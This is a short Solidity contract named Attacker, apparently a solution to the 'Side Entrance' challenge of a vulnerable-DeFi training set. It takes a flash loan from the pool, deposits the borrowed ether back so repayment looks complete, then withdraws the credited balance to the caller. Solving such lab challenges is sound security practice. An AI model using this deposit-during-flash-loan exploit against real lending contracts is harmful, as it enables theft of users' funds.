// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {

    SideEntranceLenderPool pool;

    uint256 constant ETHER_IN_POOL = 1000e18;
    
    constructor(address payable _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(ETHER_IN_POOL);
    }

    function execute() external payable {
        pool.deposit{value:ETHER_IN_POOL}();
    }

    function withdraw() public payable {
        pool.withdraw();
        payable(address(msg.sender)).transfer(ETHER_IN_POOL);
    }

    receive() external payable {}

    fallback() external payable {}



}